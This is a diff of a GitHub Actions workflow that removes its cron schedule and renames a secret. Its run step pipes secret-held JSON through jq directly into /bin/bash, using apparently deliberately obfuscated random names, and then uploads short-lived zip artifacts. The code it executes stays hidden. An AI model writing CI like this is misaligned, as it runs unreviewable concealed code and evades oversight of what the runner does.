@@ -1,27 +1,25 @@
 name: kaianchaoxun
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '24 1,13 * * *'
-
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kaianchaoxun
         env:
-          gfwjn2851: ${{ secrets.gfwjn2851 }}
+          zgffl701: ${{ secrets.zgffl701 }}
         run: |
-          printf '%s' "$gfwjn2851" | jq -r .ku7 | /bin/bash
-          printf '%s' "$b752" | jq -r .n1 | /bin/bash
-          echo $moaq173 | jq -r .just12643 | /bin/bash
-          printf '%s' "$socx41135" | jq -r .vjvfu63386 | /bin/bash
-          echo $whv31912 | jq -r .ypfxc2 | /bin/bash
-          echo $e858 | jq -r .ztnyr8316 | /bin/bash
-          echo $pafd527 | jq -r .ihx69840 | /bin/bash
-          echo $osp544 | jq -r .fdmqm45 | /bin/bash
-          printf '%s' "$rzk73" | jq -r .hap5987 | /bin/bash
-          echo $fyx02 | jq -r .ii6562 | /bin/bash
+          printf '%s' "$zgffl701" | jq -r .a8144 | /bin/bash
+          printf '%s' "$tj83909" | jq -r .zd236 | /bin/bash
+          printf '%s' "$k5416" | jq -r .tqnz09500 | /bin/bash
+          echo $jxeav230 | jq -r .yov68 | /bin/bash
+          echo $twh1 | jq -r .cw27658 | /bin/bash
+          echo $qe25 | jq -r .fn6 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: yww7002O
+          path: "*.zip"
+          retention-days: 1
